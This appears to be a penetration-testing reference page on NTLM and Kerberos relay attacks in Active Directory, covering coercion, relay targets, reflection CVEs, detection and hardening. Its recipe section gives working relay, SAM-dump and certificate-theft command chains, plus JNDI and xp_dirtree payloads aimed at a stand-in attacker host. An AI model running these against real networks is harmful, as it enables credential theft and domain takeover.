---
title: NTLM & Kerberos Relay Attacks
layout: post
date: 2026-07-31
description: "Authentication relay in Active Directory: how an attacker in-path (or reachable by a coerced client) forwards a victim's SMB / HTTP / LDAP / MSSQL authentication to a different service that treats it as legitimate, plus the coercion primitives that make the victim initiate that authentication in the first place."
permalink: /theory/windows/AD/relay/
---

# NTLM & Kerberos Relay Attacks

## Overview

Authentication relay is a family of attacks where a challenge/response exchange the attacker cannot decrypt (NTLM handshake, Kerberos AP-REQ) is forwarded intact to a different service that accepts it. The attacker never learns the plaintext credential; they just proxy the authentication and inherit the resulting session on the target service.

A relay chain has three moving parts:

1. **A way to make the victim authenticate to us** - either an active **coercion** primitive (RPC call that forces an outbound auth as the machine account) or a passive **farming** setup (dropped files, DNS/LLMNR poisoning, WebDAV).
2. **A relay stage** (`ntlmrelayx.py`, `krbrelayx.py`) that terminates the incoming authentication and re-opens the same authentication conversation against a chosen **target service**.
3. **A vulnerable target service** whose signing, channel-binding, or SPN-checking configuration lets the relayed authentication through.

The rest of this page is those three parts in order, with the CVEs that reopen historically-closed paths grouped together.

## Mechanism

**NTLM** is challenge/response over any bearer (SMB, HTTP, LDAP, MSSQL, ...). It does not bind the handshake to the underlying connection unless the caller opts in with MIC + session signing + channel binding. That is the whole reason it is relayable: the attacker sits between victim `V` and target `T`, forwards `V`'s NEGOTIATE to `T`, forwards `T`'s CHALLENGE back to `V`, forwards `V`'s AUTHENTICATE (computed with `T`'s nonce) to `T`. `T` accepts. Every NTLM defence is a variation on "bind the handshake to something the attacker cannot forge on the other side" (MIC over the messages, session key sealing subsequent traffic, channel binding token pinning the handshake to the outer TLS cert).

**Kerberos AP-REQ** is often called "not relayable" because a service ticket names its target SPN in the encrypted body and is encrypted with that target's long-term key. In practice there are three windows:

1. **Same-key SPNs on the same account (AnySPN).** Any service ticket to `HTTP/host` decrypts with the same key as `CIFS/host` when both SPNs are registered on the same account. The client can rewrite the `sname` field, which is not integrity-protected against the client. See [AnySPN / sname rewriting](/theory/windows/delegation/#anyspn--sname-rewriting--altservice).
2. **Reflection to self.** If the attacker can make the target authenticate to a name that resolves back to itself (or is tagged as loopback by SSPI), the target's SMB service accepts an AP-REQ that was minted for its own machine account. See [CVE-2025-33073](#reflection-attacks) below.
3. **HTTP → LDAP via `krbrelayx`.** Coerce an HTTP client, forward the AP-REQ to LDAP on the DC using an attacker-controlled computer account's key material to re-sign, use the resulting LDAP session to write `msDS-KeyCredentialLink` (Shadow Credentials) or `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD).

## Coercion and farming

Every coercion primitive is an RPC method exposed by a Windows service that takes a UNC path / hostname and calls out to it on behalf of the invoking user, in the machine-account security context. That is what turns the outbound auth into `HOST$@DOMAIN.LOCAL`.

| Primitive | RPC interface | Notes |
|---|---|---|
| **PrinterBug** | MS-RPRN | SpoolSS; often off on modern DCs |
| **PetitPotam** | MS-EFSR / LSARPC | Unauth on unpatched hosts (CVE-2021-36942) |
| **DFSCoerce** | MS-DFSNM | Needs DFS role present |
| **ShadowCoerce** | MS-FSRVP | VSS surface; less common |
| **Coercer** | union of all | Tries every documented method; scan / coerce / fuzz modes |
| **`coerce_plus`** | union of above | nxc wrapper, quickest first-pass |

The trigger is the same RPC call regardless of scheme, but the outbound authentication is chosen by SSPI on the victim based on the *hostname* the trigger points at:

- Hostname resolves to your IP but is **not** a valid SPN → the victim falls back to **NTLM** → `ntlmrelayx.py` downstream.
- Hostname is a valid SPN of a domain-joined machine (typically an attacker-controlled fake computer account added to AD, or a WebDAV-format listener `HOST@PORT/PATH` that forces HTTP) → the victim uses **Kerberos** → `krbrelayx.py`.

### Farming (passive alternative)

Instead of an RPC coercion, plant a file that will make a *user* trigger the auth when they browse or open it. Slower but silent. [`ntlm_theft`](https://github.com/Greenwolf/ntlm_theft) generates one file per attack variant, all "intended functionality" abuses that reach out to `\\attacker\...`:

```bash
python3 ntlm_theft.py -g all -s <attacker> -f '@myfile'
```

Common categories: `.scf` / `.url` / `.lnk` / `desktop.ini` (fires on directory listing), `.xml` (flat-OPC Word) / `.docx` / `.xlsx` / `.rtf` / `.pdf` (fires on open), `.searchConnector-ms` (fires WebClient startup on the *host*, which converts a subsequent coercion from SMB to HTTP - see below). The `@` prefix sorts the file to the top of directory listings.

CrackMapExec / nxc modules automate the drop:

- `-M slinky -o SERVER=<attacker> NAME=<label>` - plants `.lnk` on every writable share.
- `-M drop-sc -o URL=<u> SHARE=<s> FILENAME=<f>` - plants a `.searchConnector-ms` file, which **starts the WebClient service on the target host** on next browse. That upgrades any later coercion from SMB→NTLM to HTTP→NTLM, unlocking the HTTP → LDAP / ADCS family.
- `-M webdav` - reports which hosts on the segment already have WebDAV started.

### Injectable interfaces (SQL, LDAP)

An "authentication coercion primitive" doesn't have to be an RPC method. Any service that (a) takes a caller-supplied URL / UNC / hostname and (b) authenticates outbound to it under a domain identity is a coercion source. The two you meet everywhere:

**MSSQL and `xp_dirtree` (and friends).** `xp_dirtree` is an undocumented `master.dbo` extended stored procedure that recursively lists the contents of a path. When given a UNC (`\\attacker\any`), the SQL Server service reaches out over SMB and authenticates as its own service account, which is very often a domain user or a `SERVICE`-class account. Any authenticated MSSQL session with default permissions can call it: the `public` role has execute on `xp_dirtree` on most deployments. Sibling procs with the same behaviour: `xp_fileexist`, `xp_subdirs`, `xp_getfiledetails`. The captured hash is a domain-user NetNTLMv2 that either cracks offline or relays. In the Signed writeup, `xp_dirtree \\10.10.14.113\shares\test` from an initial low-priv MSSQL foothold caught `MSSQLSVC::SIGNED:...`, cracked to `purPLE9795!@`.

The multiplier: **SQL injection is a coercion primitive.** Any stacked query or subquery that reaches `EXEC master.dbo.xp_dirtree N'\\attacker\x'` (or `EXEC xp_fileexist ...`) fires the same outbound auth, no MSSQL credentials required. `sqlmap --os-cmd` uses this indirectly; a manual UNION or blind-based injection reaches the same primitive if the DBMS is MSSQL and the running principal has the standard `public` grants. Treat every MSSQL-backed SQLi as an unauthenticated coercion trigger for the SQL service account.

**LDAP referrals and JNDI-style injection.** Some LDAP client libraries follow `ldap://` referral URLs returned by the server. If you can inject into a filter or a base-DN that the app hands to its LDAP client, and the client is configured to chase referrals, pointing the referral at your own rogue LDAP server captures the client's bind credentials. The related and more common Java case is JNDI injection: an injectable field that ends up in `InitialContext.lookup()` (log4j / Log4Shell being the canonical example, `${jndi:ldap://attacker/foo}`) makes the JVM connect to your LDAP server. That connection is a plain LDAP bind with the app's service-account credentials; catch it with a Responder-style rogue LDAP daemon and you have a NetNTLMv2 to crack or relay. Same category, different transport: any app that lets a user influence the LDAP server URL it binds to is a coercion source. In practice this is much less mechanical than `xp_dirtree`, but it applies to every Java web app that queries AD without hard-coding its LDAP endpoint.

Both cases feed the same downstream: `ntlmrelayx` if you want a session, or Responder / `farmer` if you want an offline crack.

## Targets and protections

Every AD-adjacent protocol has some form of signing, sealing, or channel binding that (when configured) blocks relay. The relay is only as good as the target service's config.

- **SMB.** `RequireSecuritySignature` on both peers. When both require signing, the NTLM session key signs every SMB2 message and mid-flight relay breaks signature verification. Signing is **required on DCs** since Windows 2000. On member servers the wide production estate as of 2026 is still `signing:False` by default; Windows 11 Insider builds (June 2023 forward) and Windows 11 24H2 / Server 2025 flipped that on for the first time. `crackmapexec smb <cidr> --gen-relay-list relayTargets.txt` writes every `signing:False` host to a file, ready for `ntlmrelayx -tf`.
- **LDAP / LDAPS.** LDAP signing (`LDAPServerIntegrity=2`) rejects unsigned binds. LDAPS adds channel binding, pinning the auth to the TLS cert. Default posture since March 2020 is "both enabled" via GPO, but many DCs still run "signing allowed but not required" and no channel binding. `ntlmrelayx` bypasses channel binding by issuing `StartTLS` inside an existing bind (upgrade plain LDAP to LDAPS mid-flight for the sensitive write).
- **HTTP.** No signing at the HTTP layer. **Extended Protection for Authentication (EPA)** binds the token to the TLS cert; when off (default in many places, notably ADCS Web Enrollment), relay across TLS boundaries works.
- **ADCS Web Enrollment.** The reason HTTP-in → HTTP-out is a full compromise path. Ships with EPA disabled on many builds. Relaying to `/certsrv/certfnsh.asp` yields a client cert for the impersonated user, which then feeds PKINIT for a permanent credential.
- **MSSQL.** SSPI over TDS, no channel binding.
- **WinRM / WinRMS.** HTTP variant relayable like plain HTTP; HTTPS depends on server cert and EPA.

### The matrix (who accepts what)

Rows are incoming (what you catch), columns are outgoing (what you relay to). Prose form to fit narrow columns:

- **SMB in → SMB out, cross-host.** Alive whenever the *target* has signing off and the relayed account is a local admin on it. Auto-dumps SAM.
- **SMB in → SMB out, same host (reflection).** Dead by default (MS08-068 anti-reflection cookie). Only comes back via a [reflection CVE](#reflection-attacks).
- **SMB in → LDAP(S) out.** Blocked by DC LDAP signing by default. Reopens via CVE-2019-1040 (`--remove-mic`) or CVE-2019-1019 (`-remove-target`).
- **HTTP in → LDAP(S) out.** No signing on the HTTP layer, so this path bypasses the SMB→LDAP block entirely. Preferred whenever WebClient / WebDAV is available on the victim.
- **HTTP in → HTTP out (ADCS ESC8).** Any unpatched CA with Web Enrollment accepts a relayed NTLM auth on `/certsrv/certfnsh.asp` and mints a client cert.
- **SMB / HTTP in → MSSQL out.** Works. `xp_dirtree` becomes a secondary coercion (the SQL service account then auths outbound).
- **HTTP / SMB in → RPC out (ADCS ESC11).** Only Certipy implements MS-ICPR (`certipy relay -target rpc://<CA> -ca "<CA-NAME>"`); ntlmrelayx currently supports only `MS-TSCH` for RPC.
- **SMB / HTTP in → WinRMS out.** `ntlmrelayx -t winrms://<host>` works even when the server prints signing warnings.
- **Kerberos AP-REQ in.** `krbrelayx.py` only, and only with an attacker-controlled computer account whose Kerberos long-term key you know (`--krbsalt`, `--krbpass`).

Distinction to keep straight: **cross-host** relays are a signing / channel-binding question; **same-host reflection** is a separate class blocked at the SSPI layer.

## Reflection attacks

Windows explicitly refuses a machine account authenticating to *itself* over SMB. The SMB server checks whether the incoming token belongs to its own machine account and drops the session (MS08-068 "anti-reflection cookie"). Historically that made "coerce the DC and relay back to it" a non-starter. Five CVEs, in date order, have each removed one layer:

- **CVE-2019-1040 (Drop the MIC).** MIC field on AUTHENTICATE was not enforced; ntlmrelayx `--remove-mic` strips it and modifies target-SPN AV pairs mid-flight, unblocking SMB → LDAP against unsigned DCs. Scanner: `fox-it/cve-2019-1040-scanner`.
- **CVE-2019-1166 (Drop the MIC 2).** Second MIC-bypass path that survives 1040's patch; same practical effect.
- **CVE-2019-1019 (Your Session Key is my Session Key).** Attacker requests any NTLM session key from the DC via `NetrLogonSamLogonWithFlags` and signs/seals against any server. `ntlmrelayx -remove-target` enables it.
- **CVE-2025-33073 (CredMarshalTargetInfo, CMTI).** The current SMB-to-SMB **reflection** bypass. A hostname whose label ends in a marshalled `CredMarshalTargetInfo` blob makes SSPI treat the outbound auth as loopback (skipping the anti-reflection cookie), while DNS returns the attacker's A record. Coerce, relay to self. Minimal blob from the decoder.cloud PoC: `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`, appended to any hostname prefix. Requires DNS write on the zone (`bloodyAD add dnsRecord`). Reference: [decoder.cloud](https://decoder.cloud/2025/11/24/reflecting-your-authentication-when-windows-ends-up-talking-to-itself/).
- **CVE-2025-58726 (Ghost SPN).** Kerberos-side companion to 33073. Coerce an AP-REQ under a non-`HOST/` non-`CIFS/` SPN and relay from SMB into another protocol (typically LDAP) without needing the CMTI hostname trick.

## Practical recipes

Concrete flows tying the pieces above together. All commands assume you already have a working coercion primitive and an attacker-controlled machine.

**SMB → SMB, cross-host, mass-dump.**

```bash
crackmapexec smb 10.0.0.0/24 --gen-relay-list relayTargets.txt
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support
# Any relayed session whose identity is admin on the target: auto SAM dump.
```

**SMB → LDAP → RBCD (needs CVE-2019-1040 unpatched DC).**

```bash
sudo ntlmrelayx.py -t ldaps://DOMAIN\\'SQL01$'@DC \
                   --delegate-access --escalate-user 'attacker$' \
                   --no-smb-server --no-dump --remove-mic
printerbug.py DOMAIN/user:'pw'@SQL01 attacker@80/print   # HTTP coercion
# Consume: getST.py -spn cifs/sql01... -impersonate Administrator ...
```

**HTTP → LDAP → Shadow Credentials.** (Needs internal PKI for PKINIT.)

```bash
sudo ntlmrelayx.py -t ldap://DOMAIN\\CJAQ@DC \
                   --shadow-credentials --shadow-target jperez \
                   --no-da --no-dump --no-acl --no-smb-server
# Consume: gettgtpkinit.py -cert-pfx <pfx> -pfx-pass <p> DOMAIN/jperez jperez.ccache
#          KRB5CCNAME=jperez.ccache evil-winrm -i dc -r DOMAIN
```

**HTTP → HTTP (ADCS ESC8), all-in-one with Certipy.**

```bash
certipy find -enabled -u user@dc -p pw -stdout        # confirms ESC8
sudo certipy relay -target http://dc -template Machine
# Coerce the victim in another shell; Certipy hands you the PFX directly.
certipy auth -pfx victim.pfx -dc-ip <dc>              # -> NT hash
```

**RPC → RPC (ADCS ESC11), Certipy only.**

```bash
certipy relay -target rpc://dc -ca "DOMAIN-CA"
```

**Same-host reflection via CMTI (CVE-2025-33073).**

```bash
# 1. DNS write on the zone (needs group like "DNS Operations")
bloodyAD --host $FQDN -d $DOMAIN -u user -p pw \
         add dnsRecord localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA <attacker-ip>

# 2. Ensure target signing is off (or flip it)
nxc smb <target>                                       # look for signing:False

# 3. Relay listener
sudo ntlmrelayx.py -t smb://<target> -smb2support

# 4. Coerce the target to auth at the CMTI hostname
nxc smb <target> -u user -p pw -M coerce_plus \
    -o LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
# -> SAM dump on <target>
```

**Multi-target with SOCKS.**

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support -socks
# Every relayed identity becomes a proxychainable SOCKS endpoint.
proxychains -q smbclient.py DOM/user@target -no-pass
proxychains -q mssqlclient.py DOM/user@target -windows-auth -no-pass
```

## Kerberos relay via `krbrelayx`

[`krbrelayx.py`](https://github.com/dirkjanm/krbrelayx) requires an attacker-controlled computer account whose Kerberos long-term key material you know (`--krbsalt`, `--krbpass`). It extracts the incoming AP-REQ's session key using that material, then rebuilds an AP-REQ for a different target SPN encrypted with the target's key.

The canonical chain (HTTP → LDAP → RBCD) is:

1. Prep an attacker computer (`evil$`) with `TRUSTED_FOR_DELEGATION` set on its UAC.
2. `krbrelayx.py --krbsalt 'DOMAINevil' --krbpass '<pw>' --interface-ip <atk>`.
3. Coerce a Kerberos-speaking HTTP client - typical triggers are WebDAV coercion, WSUS, WEC, IIS with Windows Auth.
4. Relay to `ldap://dc` and write `msDS-AllowedToActOnBehalfOfOtherIdentity` on `TARGET$`.
5. S4U2Self + S4U2Proxy from `evil$` impersonating `Administrator` to `cifs/TARGET.domain.local`.
6. secretsdump on `TARGET`.

For direct ADCS ESC8 over Kerberos: `krbrelayx.py --adcs -v 'TARGET$' -t 'https://ca/certsrv/certfnsh.asp'`.

## Detection and prevention

**Detection.**

- **Event 4624 with Logon Type 3** from an unexpected source IP for a machine account (`SRV$`) is the smoking gun for relayed SMB.
- **Event 5145** on SMB shares logs the requesting IP.
- **Event 4776** on the DC when NTLM auth of a machine account occurs from an unusual IP.
- Outbound SMB from a DC to an untrusted IP (should almost never happen) is the coercion tell.

**Prevention.**

- **Enforce SMB signing everywhere.** GPO: `Microsoft network server: Digitally sign communications (always) = Enabled`, and the client-side twin.
- **Enforce LDAP signing and channel binding on DCs.** GPO: `Domain controller: LDAP server signing requirements = Require signing`; `LDAP server channel binding token requirements = Required`.
- **Enable EPA on IIS-hosted auth endpoints**, especially ADCS Web Enrollment. Registry: `HKLM\SYSTEM\CurrentControlSet\Services\WWW-Auth\ExtendedProtectionTokenChecking = 2`.
- **Remove Web Enrollment from CAs that do not need it.** Even with EPA, ADCS-HTTP is an oversized attack surface.
- **Patch.** CVE-2019-1040 / 1166 / 1019 / 2025-33073 / 2025-58726 all have patches. Missing any of them is single-CVE from a full-domain relay chain.
- **Audit `WriteProperty` on the DNS zone.** Every ADIDNS write is a coercion listener waiting to happen; help-desk-adjacent groups should not have it.
- **Disable NTLM where possible.** `Network security: Restrict NTLM in this domain`. Real environments rarely can, but the gradient matters.

## Tooling

- [Impacket](https://github.com/fortra/impacket) - `ntlmrelayx.py` (reference NTLM relay), `smbserver.py` / `smbclient.py` / `mssqlclient.py` (post-relay consumption), `getST.py` (S4U with delegation results), `gettgtpkinit.py` / `getnthash.py` (PKINIT flow after ESC8/ESC11).
- [`krbrelayx`](https://github.com/dirkjanm/krbrelayx) - Kerberos relay + `printerbug.py`.
- [PetitPotam](https://github.com/topotam/PetitPotam), [DFSCoerce](https://github.com/Wh04m1001/DFSCoerce), [Coercer](https://github.com/p0dalirius/Coercer) - coercion primitives.
- [NetExec / nxc](https://github.com/Pennyw0rth/NetExec) - `coerce_plus`, `slinky`, `drop-sc`, `webdav`, `adcs` modules; `--gen-relay-list` for target discovery.
- [bloodyAD](https://github.com/CravateRouge/bloodyAD) - `add dnsRecord` for CMTI listener injection.
- [Certipy](https://github.com/ly4k/Certipy) - the only tool that implements MS-ICPR (ESC11) relay; also a one-shot for ESC8.
- [`ntlm_theft`](https://github.com/Greenwolf/ntlm_theft) - file-format farming toolkit.
- [`fox-it/cve-2019-1040-scanner`](https://github.com/fox-it/cve-2019-1040-scanner) - Drop-the-MIC scanner.

## References

- [The Hacker Recipes - NTLM Relay](https://www.thehacker.recipes/ad/movement/ntlm/relay)
- [The Hacker Recipes - MITM & Coerced Authentications](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications)
- [dirkjanm - krbrelayx blog](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)
- [Decoder.cloud - CVE-2025-33073 CMTI reflection](https://decoder.cloud/2025/11/24/reflecting-your-authentication-when-windows-ends-up-talking-to-itself/)
- [Microsoft KB5005413 - Mitigating NTLM relay attacks on AD CS](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429)
- [Microsoft docs - Kerberos authentication overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)
